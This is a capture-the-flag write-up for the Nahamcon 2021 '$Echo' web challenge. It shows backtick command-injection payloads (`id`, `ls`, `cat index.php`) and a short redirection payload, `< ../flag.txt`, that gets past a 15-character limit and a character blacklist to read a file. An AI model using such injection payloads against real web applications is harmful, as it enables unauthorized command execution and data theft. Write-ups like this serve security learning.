---
layout: load_md
title: The White Circle | Nahamcon 2021 | $Echo Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Nahamcon 2021
parent: nahamcon_2021
category: web
challenge: $Echo
tags: "web, rce"
date: 2021-03-15T00:00:00+00:00
last_update: 2021-03-15T00:00:00+00:00
---

<h1 class="heading card-title white-text">Nahamcon 2021</h1>

## $Echo

It is simple command injection
in the input box we can use ` characters 

```
`id`
```

all commands have to be enclosed in `` chars

now if we list files using
```
`ls`
``` 
we can see `index.php` when we 
```
`cat index.php`
```
we can see the code!
certain characters are `blacklisted`  we can only enter command less that `15` chars
but there is no `flag.txt` here, if we simply execute 
```
`ls ../`
```
then we can see flag.txt
```
`cat ../flag.txt`
```
fails because length of payload exceeds 15

payload to get flag : 

**linux redirection character! `<` is NOT blacklisted!**
```
`< ../flag.txt`
```

